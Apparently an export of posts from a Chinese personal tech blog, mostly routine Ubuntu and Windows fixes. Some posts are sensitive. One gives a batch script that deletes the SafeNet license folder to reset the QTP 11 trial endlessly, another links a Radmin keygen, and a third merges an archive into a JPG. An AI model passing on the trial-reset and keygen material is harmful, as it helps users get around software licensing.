第一，把登陆那玩意隐藏起来或者挪到页脚或导航上部，不一定要当前这种漂亮的登陆框，给个链接提示就好，隐藏这事俺可以搞定，可是登陆后那个时间和状态提示目前还搞不定，希望有人能改改，取消提示或者提示挪到导航上方那行，我看也刚好合适，腾出的这个整行也就是显示logo的这行可以换成960x55的广告位，或者可以隐藏收起。 第二，侧边的那个google自定义搜索替换到页眉导航上的那个搜索就好了;","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"解决Ubuntu更新失败问题","slug":"ubuntu-apt-get-error","date":"2012-10-27T01:40:53.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"ubuntu-apt-get-error.html","permalink":"https://sobaigu.com/ubuntu-apt-get-error.html","excerpt":"最近Ubuntu更新比较频繁（实际上一直都更新频繁，你就当更新及时吧 )，总有那么一两次更新老半天还没完成。最近更新问题就比较多，比如更新flash控件就会一直停在那里，无法完成也无法取消。再比如下载30多M的内核，居然也会下载失败，或此时咱要安装个啥软件会等不了那么久，咱就会强制结束。 强制结束后问题就来了，无法再次更新，在终端使用apt-get update或upgrade会提示is locked：","text":"最近Ubuntu更新比较频繁（实际上一直都更新频繁，你就当更新及时吧 )，总有那么一两次更新老半天还没完成。最近更新问题就比较多，比如更新flash控件就会一直停在那里，无法完成也无法取消。再比如下载30多M的内核，居然也会下载失败，或此时咱要安装个啥软件会等不了那么久，咱就会强制结束。 强制结束后问题就来了，无法再次更新，在终端使用apt-get update或upgrade会提示is locked： 123xxx@expired:~$ sudo apt-get upgradeE: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it? 解决方法便是： 1.删除lock 1sudo rm /var/lib/dpkg/lock 2.更新软件库设置 1sudo dpkg --configure -a 完成后就继续更新吧。前面说的flash无法通过Ubuntu的更新管理或apt-get更新问题，还是自己到adobe网站下载so文件，然后手动替换吧，方法可以参考：Ubuntu安装flash控件，新版本的flash已经把32位和64位版本合在一起了，所以下载会得到install_flash_player_11_Linux_x86_64.tar.gz，本次更新还涉及到其他一些文件，可以看压缩包里的readme.txt. xxx@expired:~/Downloads$ cat readme.txt Adobe Systems Incorporated Flash Player 11 for Linux Version 11.2.202.243 2012 Adobe recommends that all users upgrade to the latest version of Adobe Flash Player for the most recent features, bug fixes, and security fixes. For more information on the new features in Flash Player 9, please visit http://www.adobe.com/products/flashplayer/. For more information on system requirements, fixed issues, and known issues, see the release notes at http://www.adobe.com/go/flashplayer_releasenotes. o Unpack the tar.gz file. Once unpacked you will see the following: libflashplayer.so /usr o Identify the location of the browser plugins directory, based on your Linux distribution and Firefox version o Copy libflashplayer.so to the appropriate browser plugins directory. At the prompt type: cp libflashlayer.so o Copy the Flash Player Local Settings configurations files to the /usr directory. At the prompt type: sudo cp -r usr/* /usr","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"Ubuntu 12.04 LTS命令行设置IP及DNS","slug":"ubuntu1204-set-ip-and-dns-by-terminal","date":"2012-09-17T09:21:08.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"ubuntu1204-set-ip-and-dns-by-terminal.html","permalink":"https://sobaigu.com/ubuntu1204-set-ip-and-dns-by-terminal.html","excerpt":"","text":"一般而言,Linux系统所有的发行版本设置ip和dns等都大同小异,本站有篇介绍方法的文章:Linux命令行设置ip，DNS，gateway(按此方法设置ip和网关是没问题的). 近期公司局域网病毒泛滥,又不想装杀毒软件,Windows系统下实在是防不胜防,搞烦了把那个破机器全盘格式化,装了Ubuntu 12.04.1 LTS服务器版本,用来做ftp服务器. 按以往的经验,轻车熟路地找到 /etc/network/interfaces 将其内容修改格式如下: 12345678910111213# This file describes the network interfaces available on your system# and how to activate them. For more information, see interfaces(5).# The loopback network interface#auto lo#iface lo inet loopback#定义默认以太网接口auto eth0#定义使用静态ip设置iface eth0 inet static#指定ip地址,网关和子网掩码address 192.168.17.22gateway 192.168.17.254netmask 255.255.255.0 ip和网关顺利设置完,重启机器或网络服务: 12#破机器在机房,记得自己在远程,所以千万别只顾stop,networking是没有restart操作项的.sudo /etc/init.d/networking stop &amp;amp;&amp;amp; /etc/init.d/networking start 接下来设置DNS,依然大大方方地修改了一通: /etc/init.d/resolv.conf 保存重启,DNS又没设置好,查看此文件,发现被还原了,以为是权限不够,su到root下再做一次,结果重启一个样子. 回头静想,由于自认为有经验,直接把那里面的注释无视了,⊙﹏⊙b汗. 12# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)# DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN 其实已经提示很清楚了,不能在这改,手动修改这文件改了也是白改,会被覆盖的. 网上搜索了下,原来设置方法有所小变,需要由 resolvconf配置生成才可以.自己的路不通,那就循着前人的道走一遭.在resolvconf这个程序的目录里写入一个新配置文件,文件名必须为tail: 1sudo vim /etc/resolvconf/resolv.conf.d/tail 在这个文件里写入自己要添加的DNS服务器，格式与以前的``/etc/resolv.conf`文件一致,有几个DNS就写几行nameserver配置： nameserver 8.8.8.8 nameserver 202.101.172.35 nameserver 8.8.4.4 然后输入``:wq保存退出.最后重启服务器或重启下resolvconf`程序,让配置生效: 1sudo /etc/init.d/resolvconf stop &amp;&amp; /etc/init.d/resolvconf start 回过来再看看``/etc/resolv.conf`,刚才的dns已经写入了,找个域名ping一把看看是不是已经生效了. PING baidu.com (123.125.114.144) 56(84) bytes of data. 64 bytes from 123.125.114.144: icmp_req=1 ttl=48 time =124 ms 64 bytes from 123.125.114.144: icmp_req=2 ttl=48 time=137 ms ok,正常解析,大功告成.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"教你制作内涵图","slug":"hide-something-in-a-image","date":"2012-07-22T08:51:36.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"hide-something-in-a-image.html","permalink":"https://sobaigu.com/hide-something-in-a-image.html","excerpt":"经常会在某些论坛或贴吧看到各种内涵图,懂的人都笑纳了,可小白看到了还不知道在发福利.昨儿个因为要合并一些垃圾数据再次用到了,由衷怀念起那个x-art吧… 今无聊随便写了个批处理,其实完全没技术含量,无非就是个copy命令,就当给自己稍微偷点懒吧,有需要的可以拿去,老鸟可以飘过:","text":"经常会在某些论坛或贴吧看到各种内涵图,懂的人都笑纳了,可小白看到了还不知道在发福利.昨儿个因为要合并一些垃圾数据再次用到了,由衷怀念起那个x-art吧… 今无聊随便写了个批处理,其实完全没技术含量,无非就是个copy命令,就当给自己稍微偷点懒吧,有需要的可以拿去,老鸟可以飘过: 123456789101112@echo offecho ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆echo sobaigu.comecho 访问本站获取更多小工具 echo ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆echo please drag a erogenous JPG to here and press enterset /p image=image:echo please drag your file to here and press enterset /p file=file:copy %image%/b+%file%/b ok.jpgecho the final file is ok.jpgpause 将以上代码保存为批处理,运行批处理后,首先将一张图片拖入cmd框回车,再拖入你要隐藏的文件回车,最后生成的ok.jpg就是合并后的文件了. 我写这个主要是方便制作内涵图的,所以直接是生成ok.jpg,第二次拖入的那个file请用压缩软件压缩好,7z,rar或zip都没关系,获取到内涵图后更改为压缩包后缀就能看到了.","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"chrome右下角弹升窗广告","slug":"chrome-pop-up-flash-ad","date":"2012-06-29T12:11:00.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"chrome-pop-up-flash-ad.html","permalink":"https://sobaigu.com/chrome-pop-up-flash-ad.html","excerpt":"曾几何时,打开chrome浏览网页时,会随机出现右下角升窗,且被flash block控件屏蔽,且升窗内容大多会被趋势杀毒拦截,一度以为自己机器中毒…","text":"曾几何时,打开chrome浏览网页时,会随机出现右下角升窗,且被flash block控件屏蔽,且升窗内容大多会被趋势杀毒拦截,一度以为自己机器中毒… 俺看爱情动作片基本上都是虚拟机身先士卒,本机最多会打开个种子文件下载,不知道毒从何而来.最近确实安装了几个软件,怀疑是恶意程序,十八般兵器查了个遍没发现什么异常.再说,咱用的是chrome啊,不是脆弱的microsoft internet explorer.Google本身是不可能做这事的,那么就是chrome扩展了.通过查看杀软的拦截记录,可知弹出的有淘宝也有其他一些乱七八糟的广告联盟,但总之都是咱天朝的… 既然是天朝出品,范围可以锁定国人开发的扩展了.本人共安装3个国人扩展: Thunder,QQDownload,FlashGet Files Downloader; OnlineDict; ChinaWeather and Lunar Calendar; 另外一个拦截优酷广告的脚本.开始是怀疑迅雷下载专链破解扩展,但禁止了还是会出现,以此一个个排除,最后将天气预报禁用就再也没有出现. 再次将除天气预报之外的扩展启用,再用了两天,无此情况发生…将中国天气这扩展再次启用，你会发现又开始随机右下角弹窗了… ChinaWeather and Lunar Calendar确实不错,咱也比较喜欢,可是…朱才同学也遇到了经济危机么?sorry,我不喜欢这种广告,尤其是软件更新里未提及的广告. ChinaWeather and Lunar Calendar,i have to remove it from chrome. 朱才,再见. 如果大家也有同样的情况，欢迎留言验证.","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"修改Windows默认远程端口","slug":"chang-the-mstsc-port","date":"2012-06-23T04:52:53.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"chang-the-mstsc-port.html","permalink":"https://sobaigu.com/chang-the-mstsc-port.html","excerpt":"Windows远程桌面端口默认是用的是3389端口,但是为了安全考虑,一般我们安装好系统后,都会考虑把原来的3389端口更改为另外的端口,以避免被恶意扫描及暴力破解. 以改为端口为9527端口为例,说明一下Windows远程桌面端口修改的具体操作过程.","text":"Windows远程桌面端口默认是用的是3389端口,但是为了安全考虑,一般我们安装好系统后,都会考虑把原来的3389端口更改为另外的端口,以避免被恶意扫描及暴力破解. 以改为端口为9527端口为例,说明一下Windows远程桌面端口修改的具体操作过程. 123456#主要是通过修改注册表来实现.建议修改前将原注册表项导出备份#在运行中输入regedit,打开Windows注册表编辑器HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp #双击右边 PortNumber&gt;点十进制&gt;更改值为:9527&gt;点确定. HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp#双击右边 PortNumber&gt;点十进制&gt;更改值为:9527&gt;点确定. 以上注册表修改完成后端口就改好了,然后记得要在Windows防火墙设置一下开放刚刚改好的端口. 重启服务器试下改用新的端口就可以正常远程登陆,远程登陆设置的时候记得要加上端口号连接,如:192.168.1.250:9527","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"双系统重装后修复启动菜单","slug":"fix-the-boot-menu-for-multi-sys","date":"2012-06-15T12:13:39.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"fix-the-boot-menu-for-multi-sys.html","permalink":"https://sobaigu.com/fix-the-boot-menu-for-multi-sys.html","excerpt":"机器装了双系统,Windows7和Ubuntu,用的grub启动菜单.最近Windows系统有问题,懒得折腾,决定重装系统. 如果用Windows安装盘安装,则会无情地把Ubuntu的启动菜单抹掉,如果是这种方法,我们就需要用LiveCD修复Linux的启动菜单,方法如下:","text":"机器装了双系统,Windows7和Ubuntu,用的grub启动菜单.最近Windows系统有问题,懒得折腾,决定重装系统. 如果用Windows安装盘安装,则会无情地把Ubuntu的启动菜单抹掉,如果是这种方法,我们就需要用LiveCD修复Linux的启动菜单,方法如下: 123456#用LiveCD启动Ubuntu,打开终端,运行以下命令sudo grubfind /boot/grub/stage1root (hd0, x) #x为上一步查找的结果setup (hd0)quit 咱没有Windows7的安装光盘,用PE硬盘安装方法,此法不用浪费光盘,也不用把Linux的引导菜单抹除,实在是一举多得. 具体方法也不复杂,无非是准备Windows7的iso文件(就不用解压了,浪费空间也不利于存储,用虚拟光驱加载出来即可),用u盘启动进PE安装.PE下系统安装工具一堆,随便找个NT6安装器,照提示安装,速度比光盘安装快得多. NT6安装器只是把安装文件解压到了安装Windows的分区,不会破坏Ubuntu的启动菜单,所以在grub启动菜单中还有之前的Windows7启动菜单,选择进入,将会提示错误: No such device:xxxxxxx press any key to continue 这个错误是因为重新安装系统后分区的uuid已经改变,与grub启动菜单记录的不一致,暂时忽略,按任意键将进入Windows继续安装步骤,之后就没什么两样了,安装完成后咱记得把grub启动菜单更新下,以免每次都出现那个错误,进入Ubuntu,运行grub重建命令即可: 1sudo grub-update","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"解决万象客户机无法使用远程桌面问题","slug":"solved-loguser-dll-error","date":"2012-06-13T15:43:17.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"solved-loguser-dll-error.html","permalink":"https://sobaigu.com/solved-loguser-dll-error.html","excerpt":"","text":"网吧客户机上一般会有很多软件,根据功能大致可分为以下几类: 计费软件 网吧开门当然要收钱,收钱就得有个计费监督软件,如pubwin,万象等. 网监软件 这个是天朝独有的,我们都懂的,如净网先锋,任子行等等不要脸之流. 游戏菜单 网吧是用来玩游戏的,游戏太多,所以就有了游戏菜单这么个东西,代表有顺网的网维大师,武汉的易游等. 客户机上上这么多软件后,往往受到很多限制,比如远程桌面就不是那么容易开启了.在万象的机子上就会出现用户界面失败,loguser.dll取代的报错,解决方法为取消其加载. 方法: 在取消还原保护的条件下,依次打开注册表: 1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon 可看到一个名称为ginadll的键,其值为LogUser.dll,将此键删除,然后重启再使用远程桌面就可以了. 另外,如果是网维大师环境,其驱动防火墙也会导致系统自带的mstsc无法使用,需要关闭驱动防火墙才可以,建议使用其他的远程工具,如radmin.现提供一个带注册机版本下载:Radmin 3.4+keygen.rar","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"解决godaddy被墙","slug":"solved-godaddy-is-gfw","date":"2012-06-10T07:41:15.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"solved-godaddy-is-gfw.html","permalink":"https://sobaigu.com/solved-godaddy-is-gfw.html","excerpt":"","text":"从去年7月份开始，中国的一些电信运营商就开始屏蔽部分Godaddy的DNS服务，导致大量使用Godaddy的DNS的网站无法从中国访问，这种直接屏蔽NS（域名解析）服务的手法，影响非常恶劣，为了“惩罚”某一两个所谓的“有害信息”，直接导致成千上万的无辜网站无法访问，可谓“宁可错杀一千，不可放过一个”的极端手段。 庆幸之前本人的域名一直没事，可从昨晚开始，俺的域名解析也很不稳定，联通电信的访问都无比的慢，无奈找空间提供商换了郑州的BGP，本想登录godaddy修改下A记录，哪知只能打开godaddy主页，登录链接根本无法打开，使用公司的svn无效，本地DNS更改为8.8.8.8也无济于事。。。 好嘛，GFW俺怕了你了，咱空间已经被迫搬到国内了，那就把DNS也搬到国内的dnspod吧。 第一步：注册DNSpod dnspod就不用为介绍了，很多企业都在用的，其实俺也早就想用了，一直都懒，这次被天朝倒逼了一把也好。注册方法就不用多废话了，超简洁路线，网址：https://www.dnspod.cn 第二步：添加域名 也很简单，把自己域名的Cname记录或A记录相应的填好，记下其提供的dns。dnspod还提供了实时监控功能，当然要用起来了。。。注册这么个帐号实在是免费得物有所值。（你还相信国内还有人如此为人民服务么？） 第三步：登录godaddy修改域名解析dns 这个。。。就是这个，tnnd天朝社会真是太和谐了，纳税人交那么多税真不知道为何，很多时候你想到最后只能痛恨自己，有木有？？？ 要访问godaddy，当然首先要突破狗ri的天朝防火墙了，那就使用代理吧（google的dns不好使了）。咱无产阶级，伟大的互联网中找免费午餐。打开你的搜索引擎，查找：“免费代理ip”，在线网页代理无法完成我们要做的工作，所以找代理ip，这里为推荐一个网址，省去大家胡乱找：http://www.dailiip.com 有ip了咱就开始使用，此处以Ubuntu下的chromium为例，设置如图所示，打开chromium设置标签页就看到了，如果某个ip不可用就多试几个，注意代理端口。Windows系统下的ie或其他浏览器也大同小异，有困难的自己google一把就好。 第四步：检查解析结果 搞定代理就访问你的godaddy更改域名所用的NameServers吧，godaddy自动分配的一般是NS73.DOMAINCONTROL.COM等，改为之前dnspod所提供的dns服务器，然后保存即可。 一般godaddy的dns服务器更改生效时间为2-10分钟，还是蛮快的。 不需要等多久，登录dnspod检查dns是否转移成功。dnspod提供测试页面，实在是方便。过段时间可以查看下自己的域名运行情况，如果有异常，dnspod将给你发送右键通知。 至此，俺的国内空间+godaddy域名已不受godaddy是否遭暗算影响了，godaddy等下次续费的时候再登录吧，还是伟大的天朝能耐大啊。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[]},{"title":"解决HP电脑蓝屏死机","slug":"hp-bios-failed-to-complete-the-update","date":"2012-06-03T15:37:04.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"hp-bios-failed-to-complete-the-update.html","permalink":"https://sobaigu.com/hp-bios-failed-to-complete-the-update.html","excerpt":"老婆的HP刚好过保了,过保后问题就来了,惠普蓝屏了! 系统会莫名奇妙地黑屏,运气好进了系统后会无故卡死,自动重启,时不时还会蓝屏,蓝屏代码各种都有. 运气再好点,还会出现bios错误 your bios failed to complete the update","text":"老婆的HP刚好过保了,过保后问题就来了,惠普蓝屏了! 系统会莫名奇妙地黑屏,运气好进了系统后会无故卡死,自动重启,时不时还会蓝屏,蓝屏代码各种都有. 运气再好点,还会出现bios错误 your bios failed to complete the update 重新升级下bios也能顶一阵子. 以上各种情况多在用浏览器播放视频时,心想是不是显卡驱动有问题,网上翻遍了也没体积flash导致机器蓝屏,adobe上找最新的flash装,还真装不上,flash安装程序会不断地退出再调用,调用再退出… 换个完整的离线安装包可以装上,装完能用一阵子,然后又会出现蓝屏. 这可能是被蟑螂给闹的,但蟑螂咱这一时无法请它们来商量下是否可以放过这电脑. 无奈,心想还是更新显卡驱动吧,辛辛苦苦更新完,同样还能用一阵子,一阵子过后就频繁蓝屏… 系统坏了吧,重装,反正咱用D版,备份好了就开工,刚装完真是天下太平,又回头正常的世界了.可没安稳多久,问题又复现了.难道是中毒?好嘛,重要资料备份好,装杀毒软件全盘查杀,没毒.莫非我装的什么软件导致不兼容,想想内存盘这个最有可能了,想到就卸载,卸载后也没得到好转. 怀疑中毒太深,比如鬼影或者传说中的bios病毒,据说威力不可小觑,咱就接着折腾.winpe下刷BIOS,全盘格式化重新分区,装好的系统那个叫干净啊,新机器一样. 可没用多久同样的问题出现了… 这一次我严重怀疑硬件有问题.借了同事的工具就动手,这鸟笔记本设计很脑残,螺丝上面还要盖一塑料帽,找拆解教程才知道屁股后面隐藏了俩小螺丝.最终破了点相拆开,里面两根内存条,买电脑的时候加了跟三星的,居然是ddr667,另一根原装的是ddr800,把ddr667拆下来,简单盖了下就开始拷机,一切正常.拆ddr800留ddr667拷机也正常.说明两根都没坏,可为啥突然他们就不兼容了呢? 想不通,应该还是有一根坏了吧,留了原装的用,可是少了1G内存装win7明显慢了…但问题总算解决了. 总结: 如果有此类问题,开始就先判断是软件还是硬件问题,即整个系统重装拷机,也别想是某个软件的问题,反正最后你还是要重装系统的…(^o^)/~","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"QTP11无限30天试用","slug":"qtp11-30-days-free","date":"2012-06-01T09:56:25.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"qtp11-30-days-free.html","permalink":"https://sobaigu.com/qtp11-30-days-free.html","excerpt":"以下方法在WIN7 X86+ QTP 11环境下试验通过，可以随时恢复QTP 11为30days试用版，方法非常简单。咱只是试用,没有破解,你懂的.","text":"以下方法在WIN7 X86+ QTP 11环境下试验通过，可以随时恢复QTP 11为30days试用版，方法非常简单。咱只是试用,没有破解,你懂的. 第一步: C:\\ProgramData\\SafeNet Sentinel C:\\Users\\All Users\\Application Data\\SafeNet Sentinel 找到以上目录之一，更名或者删除之. 第二步: 找到 QTP11 安装目录下bin子目录，如 C:\\Program Files (x86)\\HP\\QuickTest Professional\\bin 执行 instdemo.exe 第三步: 启动QTP,提示License warning,选择continue即可.可以连续试用30天,等30天到期再从头开始,如果HP不强制更新,理论上可以无限试用了. 按以上步骤,做了个简单的批处理,放置于QTP安装目录,到期执行一次即可. 123456@echo off rmdir /s /q &quot;%ProgramData%\\SafeNet Sentinel&quot; rem My QTP path is &quot;D:\\HP\\QuickTest Professional&quot;,把此批处理放D:\\HP目录执行即可.&quot;.\\QuickTest Professional\\bin\\instdemo.exe&quot; echo It&#x27;s done.you can use it in 30 days again. pause","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"搞软件的应该要有这种思维","slug":"if-you-are-a-programmer","date":"2012-05-30T23:59:00.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"if-you-are-a-programmer.html","permalink":"https://sobaigu.com/if-you-are-a-programmer.html","excerpt":"很老的一个段子,今天突然想到了,摘抄出来迎接六一节,也谨以此文祭奠那些为字符串醉生梦死的码农.","text":"很老的一个段子,今天突然想到了,摘抄出来迎接六一节,也谨以此文祭奠那些为字符串醉生梦死的码农. 老师在课堂上想考考学生的智商，问：“树上有10只鸟，猎人开枪打死了1只，还剩几只？” 生：“是无声手枪，还是其它没有声音的枪？” 师：“不是无声手枪，也不是其它没有声音的枪。” 生：“枪声有多大？” 师：“80-100分贝。” 生：“那就是说，会震得耳朵疼？” 师：“是的。” 生：“在那个地方，打鸟犯不犯法？” 师：“不犯。” 生：“您确定那只鸟真的被打死啦？” 师：“确定。” 此时，老师已经有些不耐烦了：“拜托，你只需要告诉我还剩几只鸟就行了，OK！” 生：“OK！鸟里有没有聋子？” 师：“没有。” 生：“有没有鸟智力有问题？呆傻到听到枪响不知道飞的？” 师：“没有，智商都在100以上！” 生：“有没有关在笼子里的？” 师：“没有。” 生：“边上还有没有其它的树？树上还有没有其它鸟？” 师：“没有。” 生：“方圆10公里呢？” 师：“就这么一棵树。” 生：“有没有残疾或饿得飞不动的鸟？” 师：“没有，身体都倍棒！” 生：“算不算怀孕肚子里的小鸟？” 师：“都是公的。” 生：“都不可能怀孕？” 师：“………我晕！绝对不可能！！” 生：“打鸟的人有没有可能看花？保证是10只？” 师：“肯定没有！10只。” 此时，下课铃声响起，老师脑门上的汗已经流下来了，但学生仍继续追问：“有没有傻得不怕死的？” 师：“都怕死。” 生：“有没有因为情侣被打中，自己主动留下来殉情的？” 师：“笨蛋！之前不是告诉你都是公的吗！” 生：“同志可不可以啊！” 师：“…………10只鸟的性取向都很正常！！” 生：“会不会一枪打死两只？” 师：“不会。” 生：“一枪打死3只呢？” 师：“不会。” 生：“4只呢？” 师：“更不会！” 生：“5只呢？” 师：“绝对不会！！！” 生：“那6只总有可能吧？” 师：“除非他妈的是猪生的才有可能！再说一遍：一枪只能打死1只！” 生：“……好吧，那么所有的鸟都可以自由活动么？” 师：“完全可以。” 生：“它们受到惊吓起飞时，会不会惊慌失措而互相撞上？” 师：“不会，每只鸟都装有卫星导航系统，而且可以自由飞行。” 生：“嗯，如果您的回答没有骗人的话，”学生满怀信心的说：“打死的鸟要是挂在树上没掉下来，那么就剩1只；如果掉下来，就1只不剩！” 此时，老师推了推眼镜，强忍着要昏倒的感觉，颤抖地说：“你可以去做程序员了!”","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[]},{"title":"Ubuntu安装过程中出现select and install software failed","slug":"ubuntu-select-and-install-software-failed","date":"2012-05-29T17:14:07.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"ubuntu-select-and-install-software-failed.html","permalink":"https://sobaigu.com/ubuntu-select-and-install-software-failed.html","excerpt":"折腾Ubuntu下开启蓝牙问题,不断地安装删除软件,不知道哪个组件删错了,把Ubuntu的网络连接管理搞没了,重装也没用,干脆,把系统重装了下. 之前多用desktop版安装,纯傻瓜式的,也不用自己分区等,特意下了个Ubuntu-12.04-alternate-amd64+mac.iso,听说定制安装稳定性会好点.暂且不论真假,反正有时间,再次熟悉下Ubuntu的安装过程也好.","text":"折腾Ubuntu下开启蓝牙问题,不断地安装删除软件,不知道哪个组件删错了,把Ubuntu的网络连接管理搞没了,重装也没用,干脆,把系统重装了下. 之前多用desktop版安装,纯傻瓜式的,也不用自己分区等,特意下了个Ubuntu-12.04-alternate-amd64+mac.iso,听说定制安装稳定性会好点.暂且不论真假,反正有时间,再次熟悉下Ubuntu的安装过程也好. 安装过程一切按提示进行,分区阶段选择了手动,心想以后在Ubuntu下保留点自己的东西,就分个/home挂载区吧,常用软件安装在/usr,也分个区吧,分好/和/boot,继续安装,到检索文件时卡半天,69个文件检索了近一个小时,最后提示 1select and install software failed 我用u盘启动安装的,恰好是个垃圾u盘量产的,想是不是u盘没量产好,再次量产,再次安装,同样的步骤,同样的地方出现同样的错误.索性,刻录张cd安装吧,安装到那步一样的报错. 返回到分区设置,看了咱这硬盘分区号都到#12了,是不是有点多,想起之前使用desktop版时貌似也出现过分区后无法安装的问题.想到就做,把Linux分区全部删除,选择使用最大空间,自动分区,顺利安装完成. 至此,回顾我的安装过程,如图所示为安装Ubuntu前已有的磁盘分区:一个主分区装了win7,另一个主分区做成了联想的一键还原保存分区(为这个一键还原,毁了我这辈子的很多收藏,具体制作方法本站亦有数篇教程分享),两个逻辑分区.也就是说最多还能创建一个主分区或n个逻辑分区. 安装Ubuntu时,如果只创建一个主分区进行安装,安装程序将直接报错,不知道为何.但万万没想到,多分几个逻辑分区,安装也无法正常进行,这个还有待高人指点.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"Ubuntu下安装音频/视频解码器","slug":"ubuntu-install-soft-with-terminal","date":"2012-05-25T13:18:08.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"ubuntu-install-soft-with-terminal.html","permalink":"https://sobaigu.com/ubuntu-install-soft-with-terminal.html","excerpt":"新安装的Ubuntu系统（其实其他Linux发行版也一样），都不会给安装上音频及视频解码器，导致你双击或右键播放某个mp3或视频时会报错，会提示安装解码器。","text":"新安装的Ubuntu系统（其实其他Linux发行版也一样），都不会给安装上音频及视频解码器，导致你双击或右键播放某个mp3或视频时会报错，会提示安装解码器。 解码器安装正常情况下输入密码后自动安装完成，但更多的时候我们更换了更新源，也不想将更新源设置为Ubuntu的main server，不知道怎么添加PUBLIC Key，剩下的就是提示安装失败： 12Requires installation of untrusted packagesThe action would require the installation of packages from not authenticated sources. 处理这个问题可以花点时间折腾update manager设置，还原为默认更新源，勾选source code等。如果不想折腾，只需要点击detail查看详情，将提示的软件包复制，用终端sudo apt-get install安装即可。 mp3解码器安装: 1xxx@xxx:~$ sudo apt-get install gstreamer0.10-fluendo-mp3 gstreamer0.10-plugins-ugly liba52-0.7.4 libdvdnav4 libdvdread4 libmad0 libmp3lame0 libmpeg2-4 liboil0.3 libopencore-amrnb0 libopencore-amrwb0 libsidplay1 libtwolame0 libx264-120 